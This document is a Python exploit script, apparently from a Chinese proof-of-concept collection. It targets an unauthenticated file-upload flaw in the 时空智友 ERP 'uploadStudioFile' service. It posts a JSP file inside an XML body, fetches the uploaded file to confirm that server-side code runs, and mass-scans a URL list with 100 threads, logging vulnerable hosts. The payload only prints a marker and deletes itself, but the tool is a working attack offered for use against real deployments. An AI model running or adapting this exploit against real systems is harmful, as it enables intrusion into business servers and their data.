#时空智友 ERP uploadstudiofile 文件上传

import argparse,requests,sys,time,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
GREEN = '\033[92m' #输出颜色
RESET = '\033[0m'

def banner():
    text = '''

   _____ __ _________  __     _______ __     __  __      __                __
  / ___// //_/__  /\ \/ /    / ____(_) /__  / / / /___  / /___  ____ _____/ /
  \__ \/ ,<    / /  \  /    / /_  / / / _ \/ / / / __ \/ / __ \/ __ `/ __  / 
 ___/ / /| |  / /__ / /    / __/ / / /  __/ /_/ / /_/ / / /_/ / /_/ / /_/ /  
/____/_/ |_| /____//_/____/_/   /_/_/\___/\____/ .___/_/\____/\__,_/\__,_/   
                    /_____/                   /_/                               
                                                            version:SKZYerp_FileUpload 1.0.0
                                                            Author: hi6
'''
    print(text)
def main():
    banner()
    #设置参数
    parser = argparse.ArgumentParser(description="时空智友 ERP uploadstudiofile 文件上传")
    parser.add_argument('-u','--url',dest='url',type=str,help="input your url")
    parser.add_argument('-f','--file',dest='file',type=str,help='input file path')
    args = parser.parse_args()
    #处理资产，添加线程
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open('url.txt','r',encoding='utf-8')as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h") 

def poc(target):
    url_payload = '/formservice?service=updater.uploadStudioFile'
    url = target + url_payload
    # print(url)
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15", 
        "Content-Type": "application/x-www-form-urlencoded", 
        "Accept-Encoding": "gzip"
        }
    data = {"content": "<?xml version=\"1.0\"?><root><filename>test.jsp</filename><filepath>./</filepath><filesize>172</filesize><lmtime>1970-01-01 08:00:00</lmtime></root><!--<% out.print(\"<pre>\");out.println(111 * 111);out.print(\"</pre>\");new java.io.File(application.getRealPath(request.getServletPath())).delete();\r\n%>\r\n-->"}
    proxies = {
    'http':'http://127.0.0.1:8080',
    'https':'http://127.0.0.1:8080'
}

    try:
        response = requests.post(url=url,headers=headers,data=data,timeout=5)
        payload2 = '/update/temp/studio/test.jsp'
        url2 = target + payload2
        response2 = requests.get(url=url2,proxies=proxies)
        if response.status_code == 200 and '12321' in response2.text:
            print( f"{GREEN}[+] {target} 存在文件上传漏洞！\n[+] 访问:{url2} {RESET}")
            with open('result.txt','a',encoding='utf-8')as f:
                f.write(target + '\n')
                return True
        else:
            print("[-] 不存在漏洞！！")
            return False
    except Exception:
        print("该站点存在问题!")


        
if __name__ == '__main__':
    main()
